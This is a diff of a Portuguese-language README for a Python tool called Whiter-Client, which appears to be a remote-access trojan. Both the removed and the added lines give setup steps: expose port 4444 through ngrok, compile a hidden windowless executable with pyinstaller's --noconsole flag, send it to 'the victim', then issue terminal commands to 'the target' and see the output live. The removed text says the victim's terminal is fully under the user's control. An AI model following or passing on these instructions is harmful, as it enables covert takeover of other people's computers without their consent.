@@ -29,40 +29,53 @@ No Android (Termux):
 pkg update && pkg install git python -y
 git clone https://github.com/Dragonmodder7/Whiter-Client.git
 cd Whiter-Client
-python client.py
+python3 client.py
 
 No Linux:
 
 sudo apt update && sudo apt install git python -y
 git clone https://github.com/Dragonmodder7/Whiter-Client.git
 cd Whiter-Client
-python client.py
+python3 client.py
+
+Servidor:
 
 
-Instalação (Servidor)
+python3 server.py
 
-1. Instale o Python e o Ngrok
-
-
-2. Rode: ngrok tcp 4444 e anote o IP e porta
+Cliente (controle remoto com menu):
 
 
-3. Substitua no client.py o IP e porta
+python3 cliente.py
 
 
-4. Gere o .exe invisível com:
+Como transformar o server.py em .EXE no Windows
 
-pyinstaller --onefile --noconsole client.py
-
-
-5. Envie o client.exe para a vítima
+1. Instale o pyinstaller:
 
 
-6. Execute python server.py e aguarde a conexão
+
+pip install pyinstaller
+
+2. Gere o executável:
 
 
-Comandos Disponíveis
 
-cd, ls, cat, exit e todos os comandos de terminal
+pyinstaller --onefile --noconsole server.py
 
-O terminal da vítima fica 100% sob seu controle. 
+3. Seu .exe estará em:
+
+
+
+dist/server.exe
+
+
+Como usar
+
+Rode o cliente.py no seu terminal
+
+O menu aparece com opções simples
+
+Envie comandos para o alvo
+
+Saída do comando aparece em tempo real 
